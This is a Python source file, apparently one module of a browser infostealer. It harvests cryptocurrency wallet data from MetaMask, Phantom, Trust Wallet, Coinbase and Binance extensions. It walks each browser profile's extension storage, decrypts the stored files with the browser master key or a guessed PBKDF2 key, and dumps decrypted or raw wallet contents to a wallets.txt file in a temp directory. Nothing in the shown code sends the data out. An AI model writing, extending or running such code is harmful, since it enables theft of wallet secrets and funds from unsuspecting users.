import os
from Cryptodome.Cipher import AES
from Cryptodome.Protocol.KDF import PBKDF2
import json
import threading
import asyncio

class CryptoWallets:
    def __init__(self, browsers_instance):
        self.browsers = browsers_instance
        self.temp_path = self.browsers.temp_path
        self.wallet_extensions = {
            "metamask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
            "phantom": "bfnaelmomeimhlpmgjnjophhpkkoljpa",
            "trustwallet": "egjidjbpglichdcondbcbdnkjaplmdb",
            "coinbase": "hnfanknocfeofbddgcijnmhnfnkdnaad",
            "binance": "fhbohimaelbohpjbbldcngcnapndodjp",
        }

    def extract_wallet_data(self, name: str, path: str, profile: str):
        local_storage_path = os.path.join(path, "Local Extension Settings") if name in ["opera", "opera-gx"] else os.path.join(path, profile, "Local Extension Settings")
        if not os.path.isdir(local_storage_path):
            print(f"No extension storage at {local_storage_path}")
            return
        wallet_file_path = os.path.join(self.temp_path, "wallets.txt")
        with open(wallet_file_path, "a", encoding="utf-8") as f:
            if os.path.getsize(wallet_file_path) == 0:
                f.write("Browser | Profile | Wallet | Status | Data\n\n")
            for wallet_name, ext_id in self.wallet_extensions.items():
                ext_path = os.path.join(local_storage_path, ext_id)
                if not os.path.isdir(ext_path) or not os.listdir(ext_path):
                    continue
                print(f"Cracking {wallet_name} ({ext_id}) in {name}/{profile}")
                for root, _, files in os.walk(ext_path):
                    for file in files:
                        if file.endswith((".log", ".ldb")):
                            file_path = os.path.join(root, file)
                            try:
                                with open(file_path, "rb") as wallet_file:
                                    raw_data = wallet_file.read()
                                    if not raw_data:
                                        continue
                                    try:
                                        iv, payload = raw_data[3:15], raw_data[15:]
                                        cipher = AES.new(self.browsers.masterkey, AES.MODE_GCM, iv)
                                        decrypted = cipher.decrypt(payload)[:-16].decode()
                                        f.write(f"{name} | {profile} | {wallet_name} | AES-GCM Decrypted | {decrypted}\n")
                                    except Exception:
                                        try:
                                            iv, payload = raw_data[:16], raw_data[16:]
                                            test_key = PBKDF2("phantom_default_pass", b"salt1234", 32, count=10000)
                                            cipher = AES.new(test_key, AES.MODE_CBC, iv)
                                            decrypted = cipher.decrypt(payload).rstrip(b"\x00").decode()
                                            f.write(f"{name} | {profile} | {wallet_name} | AES-CBC Decrypted | {decrypted}\n")
                                        except Exception:
                                            hex_data = raw_data.hex()
                                            f.write(f"{name} | {profile} | {wallet_name} | Raw | {hex_data}\n")
                            except Exception as e:
                                print(f"Error processing {file_path}: {e}")

    async def extract_data(self):
        threads = []
        for name, path in self.browsers.browsers.items():
            if not os.path.isdir(path):
                continue
            for profile in self.browsers.profiles:
                thread = threading.Thread(target=self.extract_wallet_data, args=(name, path, profile))
                thread.start()
                threads.append(thread)
        for thread in threads:
            thread.join()